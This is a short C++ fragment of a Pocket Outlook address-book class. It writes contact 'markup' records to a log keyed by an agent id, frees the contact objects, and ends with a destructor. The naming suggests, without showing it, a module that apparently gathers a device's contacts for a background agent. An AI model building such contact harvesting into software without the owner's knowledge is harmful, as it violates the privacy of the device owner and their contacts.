			storeMarkupContact[addressbookPos].sha1flag=0;
			addressbookPos++;
	}


    Log pPOOMMarkupWrite = Log();
	pPOOMMarkupWrite.RemoveMarkup(uAgentId);
	pPOOMMarkupWrite.WriteMarkup(uAgentId,(BYTE *)storeMarkupContact, sizeof(identifyContact)*addressbookPos);

    

	//dealloco gli oggetti
	for(int i=0; i < handleCount; i++)
	{
		_PoomDataServiceClient_FreeObject((DWORD*)contacts[i]);
	}

	_PoomDataServiceClient_FreeEnumerator(hPoom);



}

CPoomAddressbook::~CPoomAddressbook()
{
	CPoomAddressbook::m_pInstance = NULL;
}